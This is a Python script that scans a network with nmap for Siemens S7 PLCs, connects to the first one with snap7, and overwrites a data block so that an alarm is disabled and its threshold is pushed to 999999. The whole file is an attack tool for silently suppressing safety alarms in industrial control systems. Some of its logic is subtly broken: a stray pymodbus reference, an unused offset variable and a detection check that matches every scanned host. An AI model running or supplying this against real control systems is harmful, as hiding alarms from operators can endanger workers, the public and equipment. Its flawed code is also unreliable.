# pymodbus documentation: https://pymodbus.readthedocs.io/en/latest/

import snap7
import struct
import socket
import time
import subprocess
import re

# Configuration - ADJUST THESE VALUES
PLC_IP_RANGE = "192.168.1.0/24"  # Replace with your PLC's IP range
ALARM_BLOCK_DB_NUMBER = 10  # Replace with the actual DB number containing alarm settings
ALARM_ENABLE_OFFSET = 0  # Offset within the DB where the alarm enable flag is located (in bytes)
ALARM_VALUE_OFFSET = 2  # Offset within the DB where the alarm threshold value is located (in bytes)
ALARM_BLOCK_DATA_TYPE = snap7.util.S7AreaDB  #Data type of the block containing alarm settings
ALARM_ENABLE_LENGTH = 1 # Length of Alarm enable flag (in bytes)
ALARM_VALUE_LENGTH = 4 # Length of Alarm value flag (in bytes)
DEFAULT_ALARM_ENABLE_VALUE = 0  # Value to disable the alarm (0 = disabled, 1 = enabled)
DEFAULT_ALARM_THRESHOLD_VALUE = 999999 # Maximum alarm value to prevent it from triggering
SCAN_TIMEOUT = 2 # Scan Timeout for detecting PLC in seconds

# Function to find the PLC IP address using nmap
def find_plc_ip(ip_range):
    try:
        # Run nmap to scan the IP range for devices with Siemens S7 ports open (port 102)
        result = subprocess.run(['nmap', '-p', '102', '-sV', '-T4', ip_range], capture_output=True, text=True, timeout=SCAN_TIMEOUT)
        output = result.stdout

        # Use regular expressions to find the IP addresses with Siemens S7 service
        ip_addresses = re.findall(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
        s7_ip_addresses = []
        for ip in ip_addresses:
            if "Siemens S7" in output:
                s7_ip_addresses.append(ip)

        if s7_ip_addresses:
            print(f"PLC IP address found: {s7_ip_addresses[0]}")
            return s7_ip_addresses[0]  # Return the first found PLC IP
        else:
            print("No Siemens S7 PLC found in the specified IP range.")
            return None
    except subprocess.TimeoutExpired:
        print("Nmap scan timed out.")
        return None
    except FileNotFoundError:
        print("Nmap is not installed. Please install Nmap and try again.")
        return None

# Function to connect to the PLC and disable an alarm
def modify_alarm_settings(plc_ip, db_number, alarm_enable_offset, alarm_value_offset, alarm_enable_length, alarm_value_length, default_alarm_enable_value, default_alarm_threshold_value):
    try:
        # Initialize the S7 client
        plc = snap7.client.Client()

        # Connect to the PLC
        plc.connect(plc_ip, 0, 1)
        print(f"Connected to PLC at {plc_ip}")

        # Read the DB block (only read necessary bytes for efficiency)
        db_data = plc.db_read(db_number, alarm_enable_offset, alarm_enable_length+alarm_value_length)

        # Disable the alarm
        snap7.util.set_bool(db_data, 0, alarm_enable_offset % 8, default_alarm_enable_value)  # Assumes bit access
        print(f"Disabled alarm at DB{db_number}.DBX{alarm_enable_offset}.{alarm_enable_offset % 8}")

        # Change alarm threshold value (assuming REAL data type - 4 bytes)
        snap7.util.set_real(db_data, alarm_enable_length, float(default_alarm_threshold_value))
        print(f"Changed alarm threshold at DB{db_number}.DBD{alarm_enable_offset + alarm_enable_length} to {default_alarm_threshold_value}")

        # Write the modified data back to the PLC
        plc.db_write(db_number, alarm_enable_offset, db_data)
        print(f"Wrote modified data to DB{db_number} at offset {alarm_enable_offset}")

        # Disconnect from the PLC
        plc.disconnect()
        print("Disconnected from PLC.")

    except Exception as e:
        print(f"An error occurred: {e}")
        if plc.get_connected():
            plc.disconnect()


if __name__ == "__main__":
    # Find the PLC IP address
    plc_ip = find_plc_ip(PLC_IP_RANGE)

    if plc_ip:
        # Modify the alarm settings
        modify_alarm_settings(plc_ip, ALARM_BLOCK_DB_NUMBER, ALARM_ENABLE_OFFSET, ALARM_VALUE_OFFSET, ALARM_ENABLE_LENGTH, ALARM_VALUE_LENGTH, DEFAULT_ALARM_ENABLE_VALUE, DEFAULT_ALARM_THRESHOLD_VALUE)
    else:
        print("PLC IP address not found. Exiting.")